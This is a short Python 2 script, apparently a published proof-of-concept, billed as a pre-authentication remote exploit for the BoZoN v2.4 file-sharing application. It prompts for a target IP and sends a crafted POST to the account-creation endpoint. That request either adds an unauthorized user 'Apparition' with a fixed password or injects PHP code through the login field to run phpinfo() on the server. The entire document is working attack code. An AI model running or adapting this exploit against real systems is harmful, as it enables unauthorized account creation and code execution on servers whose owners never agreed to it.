import urllib,urllib2,time

#Bozon v2.4 (bozon.pw/en/) Pre-Auth Remote Exploit
#Discovery / credits: John Page - Hyp3rlinx/Apparition
#hyp3rlinx.altervista.org
#Exploit: add user account | run phpinfo() command
#=========================================================

EXPLOIT=0
IP=raw_input("[Bozon IP]>")
EXPLOIT=int(raw_input("[Exploit Selection]> [1] Add User 'Apparition', [2] Execute phpinfo()"))

if EXPLOIT==1:
    CMD="Apparition"
else:
    CMD='"];$PWN=''phpinfo();//''//"'

if EXPLOIT != 0:
   url = 'http://'+IP+'/BoZoN-master/index.php'
   data = urllib.urlencode({'creation' : '1', 'login' : CMD, 'pass' : 'abc123', 'confirm' : 'abc123', 'token' : ''})
   req = urllib2.Request(url, data)
   
response = urllib2.urlopen(req)
if EXPLOIT==1:
    print 'Apparition user account created! password: abc123'
else:
    print "Done!... waiting for phpinfo"
    time.sleep(0.5)
    print response.read()
